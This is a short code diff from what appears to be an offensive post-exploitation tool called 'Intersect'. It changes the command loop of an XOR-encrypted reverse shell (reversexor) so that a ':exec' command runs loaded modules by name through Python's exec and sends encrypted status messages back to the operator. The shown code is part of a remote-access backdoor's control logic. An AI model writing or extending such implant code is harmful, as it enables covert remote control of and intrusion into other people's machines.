@@ -89,7 +89,14 @@ def reversexor():
             conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
 
         elif cmd2.startswith(":exec"):
-            pass
+            getmod = cmd2.split(" ")
+            rmod = getmod[1]
+            if rmod in modList:
+                rmod = rmod+"()"
+                exec rmod
+                conn.send(xor("\n[+] Executing module...", PKEY))
+            else:
+                conn.send(xor("\n[!] Module not loaded!", PKEY))
 
         elif cmd2 == (':killme'):
             conn.send(xor("[!] Shutting down shell!\n", PKEY))
